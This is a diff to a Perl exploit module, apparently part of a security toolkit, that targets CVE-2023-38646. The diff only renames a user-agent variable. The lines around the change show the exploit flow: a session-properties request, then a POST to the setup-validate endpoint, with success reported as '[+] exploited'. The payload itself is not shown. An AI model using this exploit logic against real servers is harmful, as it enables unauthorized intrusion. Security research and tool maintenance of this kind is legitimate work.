@@ -29,8 +29,8 @@ package Spellbook::Advisory::CVE_2023_38646 {
                 $target = "https://$target";
             }
 
-            my $userAgent = Spellbook::Core::UserAgent -> new();
-            my $session_response = $userAgent -> get("$target/api/session/properties");
+            my $user_agent = Spellbook::Core::UserAgent -> new();
+            my $session_response = $user_agent -> get("$target/api/session/properties");
 
             if ($session_response -> code() == 200) {
                 try {
@@ -62,7 +62,7 @@ package Spellbook::Advisory::CVE_2023_38646 {
                         });
 
                         my $validate_request  = HTTP::Request -> new("POST", "$target/api/setup/validate", $headers, $payload);
-                        my $response = $userAgent -> request($validate_request);
+                        my $response = $user_agent -> request($validate_request);
 
                         if ($response -> code() == 400) {
                             push @result, "\n[+] $target exploited\n";
